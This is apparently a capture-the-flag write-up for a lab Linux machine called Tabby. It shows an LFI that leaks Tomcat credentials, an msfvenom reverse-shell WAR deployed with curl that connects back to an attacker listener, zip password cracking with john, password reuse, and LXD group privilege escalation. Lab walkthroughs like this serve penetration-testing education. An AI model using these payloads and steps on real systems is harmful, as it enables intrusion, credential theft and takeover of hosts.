# Tabby
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `tomcat` | Nmap, LFI, Credential Disclosure | An Nmap scan revealed ports 22 (SSH), 80 (HTTP), and 8080 (Tomcat) were open. The website on port 80 was vulnerable to Local File Inclusion (LFI) through the `news.php?file=` parameter. The LFI was used to read `/usr/share/tomcat9/etc/tomcat-users.xml`, which contained credentials for the Tomcat Manager: `tomcat:$3cureP4s5w0rd123!`. |
| 2 | `tomcat` | Tomcat WAR File Deployment, Reverse Shell | Despite the Tomcat Manager GUI being restricted, a WAR file containing a reverse shell payload was crafted using `msfvenom`. This file was then deployed to the Tomcat server using a `curl` command with the newly discovered credentials. Activating the deployed WAR file by accessing its URL triggered the reverse shell, granting an initial foothold as the `tomcat` user. |
| 3 | `ash` | Password Reuse, Backup File | After gaining a shell as `tomcat`, a system scan with linPEAS identified a backup zip file at `/var/www/html/files/16162020_backup.zip`. The zip file was password-protected. `zip2john` and `john` were used to crack the password, which was found to be `admin@it`. This password was then reused to successfully log in as the user `ash` via `su`. |
| 4 | `root` | `LXD` Privilege Escalation | A final scan with `linPEAS` as user `ash` revealed that `ash` was a member of the `lxd` group. This is a known privilege escalation vector. An Alpine Linux image was built on the attacking machine, transferred to the target, and imported into LXD. A new container was created with privileged settings and configured to mount the host's root file system. A shell was then executed within the container, providing root access to the host machine. |
| 5 | `root` | Final Flag | With root access obtained from the LXD container, the final flag was retrieved from the host's `/root/` directory. |



## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see the machine is running ubuntu, so without further doing let's dig into port 80.
As we poke around on the site we can see that all the links are pointing to de index page except this one ```http://megahosting.htb/news.php?file=statement``` since the parameter looks a lot like it is doing a file inclusion, let's try to exploit this and try to leverage an LFI.  
We can open the request in burp and try different patterns:  
```
GET /news.php?file=../news.php HTTP/1.1
Host: megahosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```
And we can see the code of the actual news.php file. Since the code is not executed, it means that we cannot turn the LFI into RCE.  
```
HTTP/1.1 200 OK
Date: Thu, 21 Apr 2022 07:35:18 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 123
Connection: close
Content-Type: text/html; charset=UTF-8

<?php
$file = $_GET['file'];
$fh = fopen("files/$file","r");
while ($line = fgets($fh)) {
  echo($line);
}
fclose($fh);
?>
```
As we can see the file is using ```fopen()```, if instead it used ```include()``` the code would have been executed instead than just being printed, and we would have had the chance to turn this LFI into RCE.  
In this case when we have include to exfiltrate php code we can use php filter function (e.g: ```php://filter/convert.base64-encode/resource=news.php```).  
Now let's try to enumerate files of tomcat, relying on [HackTricks for tomcat](https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat), as we can see there, we can enumerate users by including the following file.  
```
GET /news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml HTTP/1.1
Host: megahosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```
As we can see we get the list of users that can authenticate against tomcat as admin:  
```
[... SNIP ...]
<role rolename="admin-gui"/>
<role rolename="manager-script"/>
<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
[... SNIP ...]
```
Now that we have credentials for tomcat let's try to leverage this attack vector in order to gain an initial foothold.

## Foothold
As we open tomcat manager page we can see the following error message:  
```
403 Access Denied

You are not authorized to view this page.

By default the Manager is only accessible from a browser running on the same machine as Tomcat. If you wish to modify this restriction, you'll need to edit the Manager's context.xml file.
```
However, according to [HackTricks for tomcat](https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat) we do not need to use the manager gui to upload a war, we can simply use a curl command.  
So, now, let's prepare our payload with msfvenom:  
```
root@kali Tabby ]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.17 LPORT=9001 -f war -o revshell.war                                                                                                                               
Payload size: 1091 bytes                                   
Final size of war file: 1091 bytes                         
Saved as: revshell.war
```
And use the following curl command to deploy the war file:  
```
[root@kali Tabby ]$ curl --upload-file revshell.war -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/shell2"                                                                                               
OK - Deployed application at context path [/shell2]
```
Now we can set up a listener, and as we hit port 9001 we can gain a shell as user tomcat.  
```
root@kali:~/Documents/HTB/Boxes/Tabby# nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.194] 48468
tomcat@tabby:~$ id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

## User
Now that we have an initial foothold, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice a backup file that is pretty non-standard:  
```
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 ash ash 8716 Jun 16  2020 /var/www/html/files/16162020_backup.zip
[... SNIP ...]
```
Now, let's download the archive and see what do we have.  
As we try to open the archive, we can see that it is password-protected, so, let's try to use john to crack the password:  
```
[root@kali Tabby ]$ zip2john backup.zip > backup.hash   
[root@kali Tabby ]$ cat backup.hash                        
backup.zip:$pkzip$5*1*1*0*8*24*7db5*dd84cfff4c26e855919708e34b3a32adc4d5c1a0f2a24b1e59be93f3641b254fde4da84c*1*0*8*24*6a8b*32010e3d24c744ea56561bbf91c0d4e22f9a300fcf01562f6fcf5c986924e5a6f6138334*1*0*0*24*5d46*ccf7b799809a3d3c12abb83063af3c6dd538521379c8d744cd195945926884341a9c4f74*1*0*8*24*5935*f422c178c96c8537b1297ae19ab6b91f497252d0a4efe86b3264ee48b099ed6dd54811ff*2*0*72*7b*5c67f19e*1b1f*4f*8*72*5a7a*ca5fafc4738500a9b5a41c17d7ee193634e3f8e483b6795e898581d0fe5198d16fe5332ea7d4a299e95ebfff6b9f955427563773b68eaee312d2bb841eecd6b9cc70a7597226c7a8724b0fcd43e4d0183f0ad47c14bf0268c1113ff57e11fc2e74d72a8d30f3590adc3393dddac6dcb11bfd*$/pkzip$::backup.zip:var/www/html/news.php, var/www/html/favicon.ico, var/www/html/Readme.txt, var/www/html/logo.png, var/www/html/index.php:backup.zip                                          
[root@kali Tabby ]$ john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash                                      
Using default input encoding: UTF-8                        
Loaded 1 password hash (PKZIP [32/64])                     
Will run 2 OpenMP threads                                  
Press 'q' or Ctrl-C to abort, almost any other key for status                                                         
admin@it         (backup.zip)                              
1g 0:00:00:01 DONE (2022-04-22 10:16) 0.8264g/s 8560Kp/s 8560Kc/s 8560KC/s adornadis..adj071007                       
Use the "--show" option to display all of the cracked passwords reliably                                              
Session completed.
```
And we found a password.  
If we extract the zip file we do not see anything interesting, so we can try to use the cracked password against 'ash' the only user available in this box:  
```
tomcat@tabby:/home$ ls
ash
tomcat@tabby:/home$ su - ash
Password:
ash@tabby:~/
```
And we successfully gain access.

## Root
Once we log in, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice that user ash is part of lxd group:
```
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
OS: Linux version 5.4.0-31-generic (buildd@lgw01-amd64-059) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #35-Ubuntu SMP Thu May 7 20:20:34 UTC 2020
User & Groups: uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
Hostname: tabby
```
As we did for [shocker](Shocker.md) we know that we can leverage this group to create a linux container and mount the rootfs. Ounce the machine is booted and the rootfs is mounted we will be able to write any file on the box and even drop an ssh key for root.  
LXD is Ubuntu’s system container manager. This is similar to virtual machines, but using lightweight linux containers.  
The lxd group should be considered harmful in the same way the docker group is.  
Any member of the lxd group can immediately escalate their privileges to root on the host operating system.
To Exploit this vulnerability, first of all we need to run the following commands on our local machine:
```
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder/
bash build-alpine
```
After we run this command we can transfer the ```alpine-v3.15-x86_64-20220422_1026.tar.gz``` image to the remote server, and run the following command.
```
lxc image import ./alpine-v3.15-x86_64-20220422_1026.tar.gz --alias alpine
```
We do not get any ```error: mkdir /.config: permission denied``` as did happened for [shocker](Shocker.md), hence we can proceed with the exploit.  
```
lxc image import ./alpine-v3.15-x86_64-20220422_1026.tar.gz --alias alpine
lxc image list # verify that the image is loaded
lxc init alpine alpine-container -c security.privileged=true
lxc config device add alpine-container alpine-device disk source=/ path=/mnt/root recursive=true
```
finally, we can start the container and run a bash shell:
```
lxc start alpine-container
lxc exec alpine-container /bin/sh
```
However, we mounted the host “/” directory to the directory “/mnt/root” in the alpine container.  
So if we visit “/mnt/root”, we can see the content of the “/” directory of the host OS.
```
ash@tabby:/dev/shm$ lxc exec alpine-container /bin/sh                                                            
~ # id                                                     
uid=0(root) gid=0(root)   
~ # cat /mnt/root/root/root.txt
309d17dcbfbe5ee7dba81f0079b10982
```
